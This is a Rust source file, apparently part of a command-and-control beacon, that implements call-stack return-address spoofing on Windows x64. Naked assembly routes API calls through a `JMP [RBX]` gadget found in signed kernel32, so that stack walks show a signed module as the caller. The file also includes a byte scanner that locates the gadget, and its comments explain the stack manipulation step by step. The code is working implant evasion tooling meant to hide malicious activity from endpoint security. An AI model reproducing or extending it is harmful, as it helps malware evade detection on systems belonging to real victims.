//! Return-address spoofing: the beacon-side harness.
//!
//! Everything here is naked assembly — the only untestable surface of the
//! mechanism, kept to two tiny functions and reviewed instruction by
//! instruction.
//!
//! Calling convention walkthrough (Microsoft x64, stack alignment kept):
//!
//! `spt_spoof_call2(api, gadget, cont, arg1, arg2)` entered by `call`:
//!   - RCX = api address, RDX = gadget (a `JMP [RBX]` in a signed DLL),
//!     R8 = continuation address, R9 = arg1, [rsp+8] = arg2 (5th slot).
//!   - entry RSP points at the real return address; RSP ≡ 8 (mod 16).
//!   - the continuation address arrives as a PARAMETER, materialized by
//!     rustc as a rip-relative reference at the (PIC) call site — a `sym`
//!     operand inside the asm would emit an absolute address and break
//!     the position-independence proof (the CI catches exactly that).
//!
//! ```text
//! mov rax, rcx      ; api
//! mov r10, [rsp+8]  ; arg2 (read before the stack is rearranged)
//! push rbx          ; preserve the caller's callee-saved RBX
//! push rdx          ; the gadget becomes the API's return address
//! mov rbx, r8       ; continuation: the gadget jumps here
//! mov rcx, r9       ; arg1
//! mov rdx, r10      ; arg2
//! jmp rax           ; tail-jump: the API sees [rsp] = gadget (signed DLL)
//! ```
//!
//! The stack walk of the API now shows a signed module as its caller. When
//! the API executes `ret`, RIP lands on `JMP [RBX]` inside the signed DLL,
//! which jumps to `spt_retspoof_continue` (RBX is callee-saved, so the
//! continuation address survives the entire API call):
//!
//! ```text
//! spt_retspoof_continue:
//! pop rbx           ; restore the caller's RBX (was pushed below gadget)
//! pop r11           ; the real return address; RSP is now entry+8
//! jmp r11           ; return to the Rust caller, RAX = the API's result
//! ```
//!
//! Alignment: entry RSP ≡ 8; after two pushes RSP ≡ 8 again at the tail-jump
//! — exactly the state the API expects after a `call`.

use core::arch::naked_asm;
use core::ffi::c_void;

/// Spoofed two-argument API call through a `JMP [RBX]` gadget.
///
/// # Safety
///
/// `gadget` must be the address of a `JMP [RBX]` instruction inside a
/// mapped signed DLL, `api` a valid function of two register arguments, and
/// `cont` the address of `spt_retspoof_continue`.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn spt_spoof_call2(
    api: usize,
    gadget: usize,
    cont: usize,
    arg1: usize,
    arg2: usize,
) -> usize {
    naked_asm!(
        "mov rax, rcx",
        "mov r10, [rsp + 8]",
        "push rbx",
        "push rdx",
        "mov rbx, r8",
        "mov rcx, r9",
        "mov rdx, r10",
        "jmp rax",
    );
}

/// Continuation reached through the gadget's `JMP [RBX]`: restores RBX,
/// returns to the original caller with the API's result in RAX.
///
/// # Safety
///
/// Only ever reached through the gadget from `spt_spoof_call2`.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn spt_retspoof_continue() {
    naked_asm!("pop rbx", "pop r11", "jmp r11",);
}

/// Resolve a `JMP [RBX]` gadget in a module's `.text` by scanning for the
/// `FF 23` bytes. The original project searches several signed modules
/// (kernel32 first, then kernelbase/bcrypt/advapi32/user32/iphlpapi/winhttp);
/// this resolves kernel32 — the first in the original's list and present on
/// every supported Windows. Extending the list is a one-line change when a
/// second module is ever needed.
///
/// # Safety
///
/// `module` must be a resolved, mapped module base with intact headers.
pub unsafe fn resolve_gadget(module: *mut c_void) -> Option<usize> {
    if module.is_null() {
        return None;
    }
    let (text, len) = specter_core::peb::find_section(module, b".text")?;
    let text_bytes = core::slice::from_raw_parts(text, len);
    let offset = specter_core::retspoof::find_jmp_rbx(text_bytes)?;
    Some(text as usize + offset)
}
